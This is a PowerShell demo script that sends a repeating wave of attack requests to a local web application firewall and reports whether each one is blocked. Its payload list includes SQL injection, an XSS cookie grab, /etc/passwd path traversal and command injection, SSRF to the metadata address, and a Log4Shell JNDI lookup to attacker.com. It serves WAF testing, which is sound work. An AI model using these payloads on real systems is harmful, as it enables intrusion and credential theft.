# WAF DEMO - Auto Attack Terminal
# Run this: powershell -ExecutionPolicy Bypass -File demo-attack.ps1

$TARGET = "http://192.168.1.17:4000"
$attacks = @(
    @{ name="SQL INJECTION";     url="$TARGET/search?q=SELECT * FROM users WHERE '1'='1"; method="GET"; body=$null },
    @{ name="XSS ATTACK";        url="$TARGET/comment"; method="POST"; body='{"text":"<script>alert(document.cookie)</script>"}' },
    @{ name="PATH TRAVERSAL";    url="$TARGET/search?q=../../etc/passwd"; method="GET"; body=$null },
    @{ name="COMMAND INJECTION"; url="$TARGET/login"; method="POST"; body='{"username":"admin | cat /etc/passwd"}' },
    @{ name="SSRF ATTEMPT";      url="$TARGET/search?q=http://169.254.169.254/metadata"; method="GET"; body=$null },
    @{ name="LOG4SHELL";         url='$TARGET/search?q=${jndi:ldap://attacker.com/exploit}'; method="GET"; body=$null },
    @{ name="CLEAN REQUEST";     url="$TARGET/search?q=hello world"; method="GET"; body=$null }
)

function Write-Colored($text, $color) {
    Write-Host $text -ForegroundColor $color
}

Clear-Host
Write-Colored "============================================" Green
Write-Colored "   WAF//ENGINE - LIVE ATTACK SIMULATOR" Green
Write-Colored "   Target: $TARGET" Green
Write-Colored "============================================" Green
Write-Host ""

$round = 1
while ($true) {
    Write-Colored ">>> ATTACK WAVE $round INITIATED <<<" Red
    Write-Host ""

    foreach ($attack in $attacks) {
        $timestamp = Get-Date -Format "HH:mm:ss"
        Write-Colored "[$timestamp] FIRING: $($attack.name)" Yellow
        Write-Host "            Target: $($attack.url)" -ForegroundColor DarkGray

        try {
            if ($attack.method -eq "POST") {
                $response = Invoke-RestMethod -Uri $attack.url -Method POST `
                    -ContentType "application/json" `
                    -Body $attack.body `
                    -ErrorAction Stop
                $verdict = $response.verdict
            } else {
                $response = Invoke-RestMethod -Uri $attack.url -Method GET -ErrorAction Stop
                $verdict = $response.verdict
            }
            Write-Colored "            RESULT: ✅ $verdict" Green
        } catch {
            $statusCode = $_.Exception.Response.StatusCode.value__
            if ($statusCode -eq 403) {
                Write-Colored "            RESULT: 🚫 BLOCKED (403)" Red
            } elseif ($statusCode -eq 429) {
                Write-Colored "            RESULT: 🚫 RATE LIMITED (429)" Magenta
            } else {
                Write-Colored "            RESULT: ❌ ERROR $statusCode" DarkRed
            }
        }

        Write-Host ""
        Start-Sleep -Seconds 2
    }

    Write-Colored ">>> WAVE $round COMPLETE - $($attacks.Count) ATTACKS FIRED <<<" Cyan
    Write-Host ""
    Write-Colored "Restarting in 5 seconds... (Ctrl+C to stop)" DarkGray
    Start-Sleep -Seconds 5
    $round++
}
